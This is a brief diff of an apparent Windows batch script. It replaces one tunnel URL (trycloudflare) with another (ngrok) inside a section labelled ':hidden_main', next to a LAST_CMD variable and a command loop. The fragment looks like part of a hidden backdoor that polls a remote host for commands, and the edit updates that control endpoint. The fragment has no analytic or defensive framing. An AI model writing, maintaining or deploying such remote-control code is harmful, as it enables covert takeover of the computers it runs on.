@@ -5,7 +5,7 @@ exit
 :hidden_main
 
 setlocal enabledelayedexpansion
-set URL=https://horse-nhs-nowhere-fuel.trycloudflare.com
+set URL=https://noneconomical-trisha-waitingly.ngrok-free.dev
 set LAST_CMD=
 
 :loop
